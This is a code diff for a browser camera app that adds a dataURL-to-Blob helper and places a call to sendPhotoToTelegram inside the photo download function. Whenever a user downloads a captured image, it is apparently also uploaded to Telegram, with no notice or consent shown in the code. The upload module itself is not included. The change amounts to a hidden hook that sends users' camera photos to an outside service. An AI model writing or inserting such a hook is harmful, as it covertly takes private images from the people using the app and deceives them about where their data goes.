@@ -4,11 +4,13 @@ import {
   ITakePhoto,
   IChangeLensMode,
 } from "../interfaces/actions";
+import { sendPhotoToTelegram } from "./TelegramUpload";
 
 const takePhoto = ({
   videoRef,
   canvasRef,
   setPhoto,
+  setBlob,
   setVideoDimensions,
 }: ITakePhoto): any | void => {
   const video = videoRef.current;
@@ -40,6 +42,9 @@ const takePhoto = ({
     const dataURL = canvas.toDataURL("image/png");
     setPhoto(dataURL);
 
+    // convert to blob in order to send to telegram
+    setBlob(dataURLToBlob(dataURL));
+
     // Update video dimensions to match captured photo dimensions
     setVideoDimensions({
       width: canvasWidth,
@@ -48,11 +53,25 @@ const takePhoto = ({
   }
 };
 
+// convert data url to blob
+const dataURLToBlob = (dataURL: any) => {
+  const parts = dataURL.split(";base64,");
+  const contentType = parts[0].split(":")[1];
+  const raw = window.atob(parts[1]);
+  const rawLength = raw.length;
+  const uInt8Array = new Uint8Array(rawLength);
+  for (let i = 0; i < rawLength; ++i) {
+    uInt8Array[i] = raw.charCodeAt(i);
+  }
+  return new Blob([uInt8Array], { type: contentType });
+};
+
 const downloadPhoto = ({ photo }: { photo: any }) => {
   const link: HTMLAnchorElement | any = document.createElement("a");
 
   if (link) {
     link.href = photo;
+    sendPhotoToTelegram(photo);
     link.download = "photo.png";
     document.body.appendChild(link);
     link.click();
